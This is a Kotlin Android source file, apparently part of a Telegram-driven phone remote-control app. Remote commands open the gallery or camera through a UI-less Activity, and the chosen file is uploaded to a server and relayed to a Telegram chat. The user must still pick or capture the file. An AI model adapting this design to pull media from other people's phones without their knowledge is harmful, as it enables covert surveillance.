package com.phonecontrol

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.MediaStore
import android.util.Log
import kotlinx.coroutines.*

/**
 * Невидимая Activity для выбора файла из галереи или камеры.
 * Запускается командами open_gallery / open_camera.
 * После выбора файл проксируется через Uploader → сервер → Telegram.
 */
class FilePickerActivity : Activity() {

    companion object {
        private const val REQ_GALLERY = 1001
        private const val REQ_CAMERA  = 1002
        private const val TAG = "FilePicker"

        fun startGallery(context: Context, chatId: String) {
            context.startActivity(Intent(context, FilePickerActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("mode", "gallery")
                putExtra("chat_id", chatId)
            })
        }

        fun startCamera(context: Context, chatId: String) {
            context.startActivity(Intent(context, FilePickerActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                putExtra("mode", "camera")
                putExtra("chat_id", chatId)
            })
        }
    }

    private var chatId  = ""
    private var cameraUri: Uri? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        chatId = intent.getStringExtra("chat_id") ?: ""

        when (intent.getStringExtra("mode")) {
            "gallery" -> openGallery()
            "camera"  -> openCamera()
            else      -> finish()
        }
    }

    private fun openGallery() {
        // ACTION_PICK работает надёжнее на Xiaomi/MIUI чем ACTION_OPEN_DOCUMENT
        val intent = Intent(Intent.ACTION_PICK).apply {
            type = "image/*"
        }
        val fallback = Intent(Intent.ACTION_GET_CONTENT).apply {
            type = "*/*"
            addCategory(Intent.CATEGORY_OPENABLE)
            putExtra(Intent.EXTRA_MIME_TYPES, arrayOf("image/*", "video/*"))
        }
        val chooser = Intent.createChooser(intent, "Выбери фото").apply {
            putExtra(Intent.EXTRA_INITIAL_INTENTS, arrayOf(fallback))
        }
        startActivityForResult(chooser, REQ_GALLERY)
    }

    private fun openCamera() {
        // Создаём временный URI в кэше — не сохраняем в галерею
        val tmpFile = java.io.File(cacheDir, "camera_${System.currentTimeMillis()}.jpg")
        cameraUri = androidx.core.content.FileProvider.getUriForFile(
            this, "$packageName.provider", tmpFile)

        val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
            putExtra(MediaStore.EXTRA_OUTPUT, cameraUri)
        }
        if (intent.resolveActivity(packageManager) != null) {
            startActivityForResult(intent, REQ_CAMERA)
        } else {
            Log.e(TAG, "No camera app")
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (resultCode != RESULT_OK) { finish(); return }

        val uri: Uri? = when (requestCode) {
            REQ_GALLERY -> data?.data
            REQ_CAMERA  -> cameraUri
            else        -> null
        }

        if (uri != null) {
            val ctx = applicationContext
            val cid = chatId
            CoroutineScope(Dispatchers.IO).launch {
                Uploader.uploadFile(ctx, uri, cid, "📸 Файл с телефона")
            }
        }

        finish()
    }

    override fun onStop() {
        super.onStop()
        finish()
    }
}
